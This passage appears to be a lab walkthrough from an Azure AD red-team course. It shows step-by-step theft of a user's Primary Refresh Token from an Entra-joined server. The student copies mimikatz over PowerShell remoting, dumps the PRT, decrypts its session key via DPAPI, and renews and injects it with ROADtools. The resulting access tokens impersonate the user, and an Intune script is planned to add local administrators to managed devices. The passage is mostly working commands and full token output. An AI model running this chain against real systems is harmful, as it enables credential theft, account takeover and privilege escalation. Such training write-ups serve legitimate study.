[51.116.180.87]: PS C:\Users\student72\Documents> $creds = New-Object System.Management.Automation.PSCredential('.\student72', $password)
[51.116.180.87]: PS C:\Users\student72\Documents> $infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds
[51.116.180.87]: PS C:\Users\student72\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{hostname;whoami}
infradminsrv
infradminsrv\student72
```
- We can check if `infradmsrv` is 'Entra ID'-joined and try to steal a PRT cookie.
```powershell
[51.116.180.87]: PS C:\Users\student72\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{dsregcmd /status}

+----------------------------------------------------------------------+
| Device State                                                         |
+----------------------------------------------------------------------+

             AzureAdJoined : YES
          EnterpriseJoined : NO
              DomainJoined : NO
               Device Name : infradminsrv

<snip>
```

- We will create folders on both `jumpsrv` and `infradmsrv` to transfer tools.
```powershell
[51.116.180.87]: PS C:\Users\student72\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{mkdir C:\Windows\Tasks\student72}


    Directory: C:\Windows\Tasks


Mode                 LastWriteTime         Length Name                                                                                                          PSComputerName
----                 -------------         ------ ----                                                                                                          --------------
d-----          3/9/2024   4:07 PM                student72                                                                                                     10.0.1.5

[51.116.180.87]: PS C:\Users\student72\Documents> mkdir C:\Windows\Tasks\student72


    Directory: C:\Windows\Tasks


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2024   4:10 PM                student72

[51.116.180.87]: PS C:\Users\student72\Documents> exit

PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\mimikatz.exe -Destination C:\Windows\Tasks\student72\mimikatz.exe
PS C:\AzAD\Tools> Enter-PSSession -Session $jumpvm
[51.116.180.87]: PS C:\Users\student72\Documents> Copy-Item -ToSession $infradminsrv -Path C:\Windows\Tasks\student72\mimikatz.exe -Destination C:\Windows\Tasks\student72\mimikatz.exe
```

- We can now use **Mimikatz** to steal the PRT.
```powershell
[51.116.180.87]: PS C:\Users\student72\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Windows\Tasks\student72\mimikatz.exe sekurlsa::cloudap exit}

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::cloudap

Authentication Id : 0 ; 1331925 (00000000:001452d5)
Session           : RemoteInteractive from 2
User Name         : MichaelMBarron
Domain            : AzureAD
Logon Server      : (null)
Logon Time        : 2/15/2024 3:45:08 AM
SID               : S-1-12-1-1906772070-1138033136-3072666522-3468280978
        cloudap :

Authentication Id : 0 ; 1331908 (00000000:001452c4)
Session           : RemoteInteractive from 2
User Name         : MichaelMBarron
Domain            : AzureAD
Logon Server      : (null)
Logon Time        : 2/15/2024 3:45:08 AM
SID               : S-1-12-1-1906772070-1138033136-3072666522-3468280978
        cloudap :
             Cachedir : 2204f26d4684c1769fba70f01aa163edc1cd75f78b07da5dc291ab3f5a05fca6
             Key GUID : {1d1b7859-7ae9-4226-83bd-62687be1b4ae}
             PRT      : {"Version":3, "UserInfo":{"Version":2, "UniqueId":"71a70866-01f0-43d5-9a2b-25b792c4b9ce", "PrimarySid":"S-1-12-1-1906772070-1138033136-3072666522-3468280978", "GroupSids":["S-1-12-1-1447816280-1182106782-1856018870-3271737113"], "DisplayName":"Michael M. Barron", "FirstName":"", "LastName":"", "Identity":"michaelmbarron@defcorphq.onmicrosoft.com", "PasswordChangeUrl":"https:\/\/portal.microsoftonline.com\/ChangePassword.aspx", "PasswordExpiryTimeLow":3583418367, "PasswordExpiryTimeHigh":2147483446, "PublicInfoPublicKeyType":0, "Flags":0}, "Prt":"MC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b2M3cWpodG9CZElzblY2TVdtSTJUdkVBQ2suQWdBQkFBRUFBQURuZm9saEpwU25SWUIxU1ZqLUhnZDhBZ0RzX3dVQTlQXzJzaHJRSTJ4NHlMd3pqZUpsTDNwRFZXMlZTNUIxZnM1RFpzcVl0clB4bEdmNTJ6TGJDOEhBMmVwLW1EZFZiTklDUU9fOU9PY0ZUSFJ1bjUzR2RsVDlIYTZYcVhrS3pHODVjdElZSmZ6SnllRlU3VUttMm9FcDRQT3o4RXhpWGZJR2JrOXM4dW9jcGdOcDJPT1ladUxvT04zRWFoZG9RZG0zMVRRNUwzX3pZWDZYNHQyRGtkQmlvR080UXd5U1R4amVNQkRpV2R2c2xiUjY1RjZWOFJUR1lpN1p2a1VfWGZkX3NUSER5cDdlaWp5amdUVHl5eFpXZDd3cy15UWlleHdZLUx3VmJRNEt1QkRfbGg4WlM2Sk9tWnR2V2JibXN2eVBDeFVZWjJtRnNrbE1yMlFCMVFDcFo5b2w1Q2VBQndkOVZ0U1g0dFA0aDJ4d3N1SWpBYXdvSXdyRF9SdkRxOFpFWTl0X0xkak94VHQ2bUppeV9HbGhkR3dqVmpxdkdPcXRCZ3pTYW9ub01pZXltYmpWZGRybEhadS0wYWRQSzRUclpnQ3pBUzZIZHRmSjZ4RzlGYXVQa2VSbmd6dnBtdi1oSnFwSjdVSDZHaV9WRV9JUG80aXlReENnaFVBSGVyWFpNM1E4Zkx1TlVaeG9JdDQxRGU5RkFfS2FKQ3BQQlNweTRDV2o5QUZOeWl6SmJTSGMyS0RoRHI4Q2hsVGVlMkdxeWxTYzFvc0VsbVJ3Nl8tM08zdlJLWkhkMGMtVVdjeldNaEg5Uzl6SS1rd0JOMWgwdDFyS092aGtXbGRkem50TVFmaTRaRnRvNmo0bDdXYjlqbVBLN2ZKTUoyOWE2VUdxdVNnYjNnWjVFVm1MWFM3REVYei1WbzB1YWU1RW1teXROcVIzYWMyOEFVb1pBdTdKMk9NZHozaHBZYWZUVUpZS0NIdUVlR3ZKbkJhRlJ3aHM1bHNrYzh0NHdlaDFuWW1mZ1JGLWFKbEI4MmV6YUtrOUJBV3E1YkZ3bmlTemFYZnlsc25sYUd0NnhieVpGVjRqX2xfYTJwc1J3cjRqWlpwMkw5MExzbGsxR0xIbFprUTdVbjNmVklYWkZ3SlZOcmpSRjJQcVhJOVIzbGVOOVRnTnZjd3VSVnF3aG9EU04xWTdBT1lPcHVqU0FfSVNGczl6", "PrtReceivedtime":1709988917, "PrtExpirytime":1711198516, "ProofOfPossesionKey":{"Version":1, "KeyType":"ngc", "KeyValue":"AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACp8UXU1QhFQJ_ZWmd-2dzOAAAAAAIAAAAAABBmAAAAAQAAIAAAAFH-c_inWli2ht9pqNhP3xGuHNNazNCBdK6EdvW4rfhNAAAAAA6AAAAAAgAAIAAAABNwZMFuagcWPV1dqCkytYm0Xt05TmNrJXBzD7dGBkUaMAAAADfcfByGD_YYg4LcaVORdqP3kk0yl_QKBq72ZQNHMra1PKuyEpZEKhvVKhquRQ5mFUAAAADRyXedgP4BkYSfvcx6EMNH5QkxWft5RZjUdoZ9QTt2nyL1wCrJyx3Zdd40Le3PprJ5mAlnO4cIYUVGh5VBpvbA"}, "SessionKeyImportTime":1709195415, "CloudTgtMessage":"a4IIRzCCCEOgAwIBBaEDAgELox4bHEtFUkJFUk9TLk1JQ1JPU09GVE9OTElORS5DT02kNTAzoAMCAQGhLDAqGyhtaWNoYWVsbWJhcnJvbkBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tpYIGlWGCBpEwggaNoAMCAQWhHhscS0VSQkVST1MuTUlDUk9TT0ZUT05MSU5FLkNPTaIxMC-gAwIBAqEoMCYbBmtyYnRndBscS0VSQkVST1MuTUlDUk9TT0ZUT05MSU5FLkNPTaOCBjEwggYtoAMCAf-iggYkBIIGIAAAGgYAAAEAASABAAAA536JYSaUp0WAdUlY_h4HfL1IECQhEecFp9qOVfpsWXBGwsLqY22WxbuapOCtocpZWMmy14CBQXa4hlP7CMwlV3VTfKRMv3ixazN3I3Zp4Tj9FF78dbYE72VleUe6zvDjRQCVe-6ujCcbgUbwiHJ0Lt0OHr8sbksK18bTADYsMhQUHF15wxTsqT2nn7A5ewFwxb8ofJYnyWuwkGiEYitCqxKpCnDLVt2nSZvFVBG7pMaUUOgk9DX8esTi_S_BLPxPA-OPEIKpdx6ypcUqTnmQQrgFm_EcXEZic24XrT-Z4apueX1255ykBL2s5DCBiPJJNK8x9fHKnAadGouz5wNIEGwaFR5iXoBl7b98X-dYAlkHbrlEnJu8SXBPaYoSpRIA5Nx6y5VwTpGL2UM1b-gQ-wpdHhkCDYUCTKDIzVmKYpq2YDz6wJJiBupG9QJIhtymlnHSoatb6cZyrwAg_X_oQoKb_qVdOkmum7Nag22caqODCYOlBS4JCbNEMbLEAaKN_IkeL6h35enrSL8CGfgCWWxey23qY3U46EjSWkZtjt7yPGr6Tw-y71h-UsXO0avjGMI1kUdnR41Snpv1gTu9bHR17Ejw4loRnqu6JsdV223GTWugdWksVdpschLcrbJsIq48fgSi-6isPCvcU5XmbDs9-jl6xvJNqRcS3-zvsaLK7SpNPOhYaoy4ror0D2Rn6_bwGxgCZRAX29Y1vMNF9kl3VkEDpnpN9Aede7OEZlel_1ZKKVn297tlPgJtEAOPVr5c6fc-6mpoOyMCHXl6w5oUcCwMzna3l8hBTALYbPlE5v-rKMBltwTkMBkurXpV31FX30XcBLNBUiA-JVAbajVmFBzkkDkgAfO_ecbcrLhvO1IDTc-2BphjEb_MUJSZhsI9EIrI8X5F79oXUQ9gJCJUsr6dHIqToyndKv9vP8BEmZ0bH0HNIrWHEfTcGtDIejTFDyLAge8FR2fvwyAe5GWP-f1KhkFCLNu838DWyXrbMQcbC-tqxjaUJjYywpXh4YDaBqdUzSuU2OO0RRz-kBmiaw_iS7hQjL-rqDhuGWAkGGkLbU18RvXvYDZXZfu6aetJDueKoMOVI88gqlNGNREZR6kgepWs69IOIggvNrgbqw6tRTHXvgYr-xuOmAARRlQzNuBgU4SqKSCgftwKXexcdVKnenNHY_GrK3aiMQuVqQguba3OdxX5UdEULqfnblGeNf__V3DeYiyJxUB6jNVZ_4u7-Q7ptoOL3SMedd7-ZdylW9mYDXOGFrVo1V2hBnCql1SzK_RT7_T_HAYKORjJ88bZOLCOKjRURoFpRwPj3fpwVvxebEHtFQQIthu2G4nJACslngZlj0ND9OEJeNQM4-zqyHd6COyXaWfHwPJXZ6PwaEWWb_yHqcoNFQqyfB1rwD5GeHOwimbxa28gKZeXjRim-MjkM1-RWw4-GXYoLQ3ABd3cbA6TKUEmZiCjRpRM-6bifooKkB49iQe6uD-nwvrckoTowvCK1h6D8nx2jCq3Rz_nzCwxNa8AyewErN_9kRZ6Hm--ohWW9SBOIv_zTdLw27LsdxXSIxoLn4HduJznlXUZ2LxItis1kSvyS1SJ3aCeeOb-ZyOUNj-aZ_sL8cH6hl8_qHdrzFF2yj49S1cnmaDjieSHqQJFatt0tTQ6KJUdSYmX2amXznWsmXdjy5t8Wkgd4uSQZ__4MPBXfQH-jUyr47jM1xAKuFYuz6HDd4yn-nR34hEdE0_FqoqxgYZjoPhkdKbXJXym4H643rkJWh40nViAysEjUB9wx-A3ExKx6c4Hat8zfxSZer91kCJ8TmI2GdRUoEYqrIXbfLwc8i6xkEyQBmHZiBO7nZ_8PJnFiWqraJB8l7XtVrbC_lqgWFFD_VJYZQJUPpgvGfyW9QMsy5IAdzlyKyn-FuJNGnruuLzunmZWNX9vuRLn4wRbLJDPHy8G-_6_Ng4I4w1UGglajvB7oNOMytqKwWqs74wrr-FXUAQHpKlsSJ8yczTtItyKRez6uDm1v1cgTvnmJk6fJnVMw5UtfNkb_Wt1Apg58tKZlSHiT4774SAApoIBRTCCAUGgAwIBEqKCATgEggE0kQkgL8mPOFsIEbRu8DPphVq6sR_kKUmipQKJNvfnGqmd5r2FSHIMFolBvaBbWdn_OURTAezJtowciWxnf5Ttxaf5qdVL7penaA7vfsJ-0CwGrCvg_QhddHb29B75Y8DVMahzhMxMn_lI26V6IcdVz1YoAF6ciPYyal8z9u0L3dvrXsd2M2ZrBPj6EIfW-sE1yWKk-IUNXVw0WLe8qgvDKrOdDZs4cJ9J7ECfABP8q6PAkbNS1cBufcj-e9v4Gg3UjaB08kAbKGO_lKHrZt_Dl3taP3XnjvzMxt24-XlpQuZgh06zTSKKGeSdFKFC-Kkz8SV-poICHmck2riD-ixaSS76LZS7MKf5m5agegQIvQTSdrFpp6R-nq1toKoBn5S0Z5Va9jsydWoifSliNcsuzPm-ido", "CloudTgtClientKey":"ehI7rURs_C8C3_grzD-1S5SdY9WqT3iZVBygDs0rvJA", "CloudTgtKeyType":18, "TenantId":"2d50cb29-5f7b-48a4-87ce-fe75a941adb6", "UserName":"michaelmbarron@defcorphq.onmicrosoft.com", "Subject":"bEZ9iMsWFCNd3otfBQsyCc9t2DOgpN9p6ZvE8vArPtE", "AuthorityUri":"https:\/\/login.microsoftonline.com", "DeviceId":"a7177d1f-e967-49ef-9ffc-b7b7766f2eec", "DeviceCertificateThumbprint":"oLVeiglhAHfvWeSBHZSHAeKUMEY", "ClientInfo":"eyJ1aWQiOiI3MWE3MDg2Ni0wMWYwLTQzZDUtOWEyYi0yNWI3OTJjNGI5Y2UiLCJ1dGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2In0", "KerberosTopLevelNames":".windows.net,.windows.net:1433,.windows.net:3342,.azure.net,.azure.net:1433,.azure.net:3342", "EnterpriseSTSInfo":{"Version":0, "PRTSupported":0, "WinHelloSupported":0, "WinHelloKeyReceiptSupported":0, "KdfVer2":0}, "IsRestricted":0, "CredentialType":1, "DsrInstance":0, "AdfsPasswordChangeInfo":0, "AccountType":1, "IsDefaultPasswordChangeUri":0}
             DPAPI Key: fc2ff09b252861698973c638b72216a21e684127b3220676c416c4bb94474f45bae7b1cbdfbef3dff9206a34b12a8c678f49a7d982b306b9c7c79fd74f4ab5a7 (sha1: eb373eec63a0621a443c0ef58be683611c90fe60)

Authentication Id : 0 ; 1300956 (00000000:0013d9dc)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/15/2024 3:45:06 AM
SID               : S-1-5-90-0-2
        cloudap :

<snip>
```

- We will use the `Key Value` to decrypt the key using DPAPI.
```powershell
[51.116.180.87]: PS C:\Users\student72\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Windows\Tasks\student72\mimikatz.exe "token::elevate" "dpapi::cloudapkd /keyvalue:AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACp8UXU1QhFQJ_ZWmd-2dzOAAAAAAIAAAAAABBmAAAAAQAAIAAAAFH-c_inWli2ht9pqNhP3xGuHNNazNCBdK6EdvW4rfhNAAAAAA6AAAAAAgAAIAAAABNwZMFuagcWPV1dqCkytYm0Xt05TmNrJXBzD7dGBkUaMAAAADfcfByGD_YYg4LcaVORdqP3kk0yl_QKBq72ZQNHMra1PKuyEpZEKhvVKhquRQ5mFUAAAADRyXedgP4BkYSfvcx6EMNH5QkxWft5RZjUdoZ9QTt2nyL1wCrJyx3Zdd40Le3PprJ5mAlnO4cIYUVGh5VBpvbA /unprotect" "exit"}

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

776     {0;000003e7} 1 D 28395          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;908bbfe0} 0 D 2427405917  infradminsrv\student72  S-1-5-21-1954647462-1816938007-639921617-1988   (11g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2427705133  NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # dpapi::cloudapkd /keyvalue:AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACp8UXU1QhFQJ_ZWmd-2dzOAAAAAAIAAAAAABBmAAAAAQAAIAAAAFH-c_inWli2ht9pqNhP3xGuHNNazNCBdK6EdvW4rfhNAAAAAA6AAAAAAgAAIAAAABNwZMFuagcWPV1dqCkytYm0Xt05TmNrJXBzD7dGBkUaMAAAADfcfByGD_YYg4LcaVORdqP3kk0yl_QKBq72ZQNHMra1PKuyEpZEKhvVKhquRQ5mFUAAAADRyXedgP4BkYSfvcx6EMNH5QkxWft5RZjUdoZ9QTt2nyL1wCrJyx3Zdd40Le3PprJ5mAlnO4cIYUVGh5VBpvbA /unprotect
Label      : AzureAD-SecureConversation
Context    : 5b508c28107703f89c9017f5d404cbcc77b859a662989d11
 * using CryptUnprotectData API
Key type   : Software (DPAPI)
Clear key  : 4e8fdfc63e000085df6eaf2dfa319b253a6fef8ecb20a6dc306688a392e138da
Derived Key: c15f8e323a5a36841a2145e26baf79cae7f4f01aff6691d821aa0bd8205b6534

mimikatz(commandline) # exit
Bye!
```

- We can now use PRT and the decrypted Session Key (Clear key) to renew the PRT.
```powershell
PS C:\AzAD\Tools> cd C:\AzAD\Tools\ROADTools
PS C:\AzAD\Tools\ROADTools> .\venv\Scripts\activate
(venv) PS C:\AzAD\Tools\ROADTools> roadtx prt -a renew --prt MC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b2M3cWpodG9CZElzblY2TVdtSTJUdkVBQ2suQWdBQkFBRUFBQURuZm9saEpwU25SWUIxU1ZqLUhnZDhBZ0RzX3dVQTlQXzJzaHJRSTJ4NHlMd3pqZUpsTDNwRFZXMlZTNUIxZnM1RFpzcVl0clB4bEdmNTJ6TGJDOEhBMmVwLW1EZFZiTklDUU9fOU9PY0ZUSFJ1bjUzR2RsVDlIYTZYcVhrS3pHODVjdElZSmZ6SnllRlU3VUttMm9FcDRQT3o4RXhpWGZJR2JrOXM4dW9jcGdOcDJPT1ladUxvT04zRWFoZG9RZG0zMVRRNUwzX3pZWDZYNHQyRGtkQmlvR080UXd5U1R4amVNQkRpV2R2c2xiUjY1RjZWOFJUR1lpN1p2a1VfWGZkX3NUSER5cDdlaWp5amdUVHl5eFpXZDd3cy15UWlleHdZLUx3VmJRNEt1QkRfbGg4WlM2Sk9tWnR2V2JibXN2eVBDeFVZWjJtRnNrbE1yMlFCMVFDcFo5b2w1Q2VBQndkOVZ0U1g0dFA0aDJ4d3N1SWpBYXdvSXdyRF9SdkRxOFpFWTl0X0xkak94VHQ2bUppeV9HbGhkR3dqVmpxdkdPcXRCZ3pTYW9ub01pZXltYmpWZGRybEhadS0wYWRQSzRUclpnQ3pBUzZIZHRmSjZ4RzlGYXVQa2VSbmd6dnBtdi1oSnFwSjdVSDZHaV9WRV9JUG80aXlReENnaFVBSGVyWFpNM1E4Zkx1TlVaeG9JdDQxRGU5RkFfS2FKQ3BQQlNweTRDV2o5QUZOeWl6SmJTSGMyS0RoRHI4Q2hsVGVlMkdxeWxTYzFvc0VsbVJ3Nl8tM08zdlJLWkhkMGMtVVdjeldNaEg5Uzl6SS1rd0JOMWgwdDFyS092aGtXbGRkem50TVFmaTRaRnRvNmo0bDdXYjlqbVBLN2ZKTUoyOWE2VUdxdVNnYjNnWjVFVm1MWFM3REVYei1WbzB1YWU1RW1teXROcVIzYWMyOEFVb1pBdTdKMk9NZHozaHBZYWZUVUpZS0NIdUVlR3ZKbkJhRlJ3aHM1bHNrYzh0NHdlaDFuWW1mZ1JGLWFKbEI4MmV6YUtrOUJBV3E1YkZ3bmlTemFYZnlsc25sYUd0NnhieVpGVjRqX2xfYTJwc1J3cjRqWlpwMkw5MExzbGsxR0xIbFprUTdVbjNmVklYWkZ3SlZOcmpSRjJQcVhJOVIzbGVOOVRnTnZjd3VSVnF3aG9EU04xWTdBT1lPcHVqU0FfSVNGczl6 --prt-sessionkey 4e8fdfc63e000085df6eaf2dfa319b253a6fef8ecb20a6dc306688a392e138da
Renewing PRT
Saved PRT to roadtx.prt
```

- We can now inject the cookie to Azure to authenticate ourselves as `michaelmbarron@defcorphq.onmicrosoft.com`.
```powershell
(venv) PS C:\AzAD\Tools\ROADTools> roadtx browserprtauth -url https://portal.azure.com
Exception managing chrome: expected value at line 1 column 1

DevTools listening on ws://127.0.0.1:59690/devtools/browser/cc547945-b505-4b16-b1d7-7a8e1405b865
```

- We can also request access tokens for `michaelmbarron@defcorphq.onmicrosoft.com` and use them to authenticate to Azure via PowerShell.
```powershell
(venv) PS C:\AzAD\Tools\ROADTools> roadtx prtauth -c azps -r azrm --tokens-stdout
{"accessToken": "eyJ...0-zCd_g", "tokenType": "Bearer", "expiresOn": "2024-03-09 10:15:16", "tenantId": "2d50cb29-5f7b-48a4-87ce-fe75a941adb6", "_clientId": "1950a258-227b-4e31-a9cf-717495945fc2", "expiresIn": "4965", "refreshToken": "0.AXAAKc...dMM3BCw"}
(venv) PS C:\AzAD\Tools\ROADTools> roadtx prtauth -c azps -r msgraph --tokens-stdout
{"accessToken": "eyJ0eXA...OxdHRbdnDAg", "tokenType": "Bearer", "expiresOn": "2024-03-09 10:05:06", "tenantId": "2d50cb29-5f7b-48a4-87ce-fe75a941adb6", "_clientId": "1950a258-227b-4e31-a9cf-717495945fc2", "expiresIn": "4340", "refreshToken": "0.AXAA...r6WS2QDc"}
(venv) PS C:\AzAD\Tools\ROADTools>
```

```powershell
PS C:\AzAD\Tools> $armtoken = 'eyJ0...h0-zCd_g'
PS C:\AzAD\Tools> $msgraphtoken = 'eyJ0...bdnDAg'
PS C:\AzAD\Tools> Connect-AzAccount -AccessToken $armtoken -MicrosoftGraphAccessToken $msgraphtoken -AccountId michaelmbarron@defcorphq.onmicrosoft.com

Account                                  SubscriptionName TenantId                             Environment
-------                                  ---------------- --------                             -----------
michaelmbarron@defcorphq.onmicrosoft.com                  2d50cb29-5f7b-48a4-87ce-fe75a941adb6 AzureCloud
```

- We can see that `michaelmbarron@defcorphq.onmicrosoft.com` has the `Itune Administrator` Role, which means that it can run scripts to devices enrolled to Intune.
- We can go to `https://intune.microsoft.com/#view/Microsoft_Intune_DeviceSettings/DevicesMenu/~/scripts` and go to `Platform Scripts` to deploy a PowerShell script that adds a new user to the administrators local group of the devices managed by Intune.
- Once we get access to `DESKTOP-M7C1AFM` we can start enumerating it.
```powershell
[172.16.2.24]: PS C:\Users\student72\Documents> cat C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
```